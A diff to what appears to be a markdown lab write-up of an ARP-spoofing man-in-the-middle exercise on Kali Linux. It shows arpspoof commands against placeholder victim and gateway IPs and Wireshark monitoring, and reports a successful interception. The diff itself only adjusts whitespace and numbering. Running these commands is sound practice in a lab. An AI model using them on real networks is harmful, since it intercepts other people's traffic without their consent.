@@ -18,14 +18,14 @@ sudo sysctl -w net.ipv4.ip_forward=1
 2. Executing the ARP Spoof
 Initiated a bi-directional attack to position Kali as the "Man-in-the-Middle":
 
-Terminal 1 (Victim): 
+ Terminal 1 (Victim): 
 ```bash
-sudo arpspoof -i eth0 -t [Victim_IP] [Gateway_IP]
+ sudo arpspoof -i eth0 -t [Victim_IP] [Gateway_IP]
 
 ```
-Terminal 2 (Gateway):
+ Terminal 2 (Gateway):
 ```bash
-sudo arpspoof -i eth0 -t [Gateway_IP] [Victim_IP]
+ sudo arpspoof -i eth0 -t [Gateway_IP] [Victim_IP]
 
 ```
 3. Traffic Analysis (Wireshark)
@@ -33,7 +33,7 @@ sudo arpspoof -i eth0 -t [Gateway_IP] [Victim_IP]
    wireshark
 I monitored the eth0 interface and filtered for the victim's IP.
 
-3. Observations & Performance Constraints
+4. Observations & Performance Constraints
 
 *Actual Findings:*
 * successful Interception: Confirmed that Kali successfully positioned itself in the traffic path, as evidenced by a massive influx of packets in the Wireshark capture window.
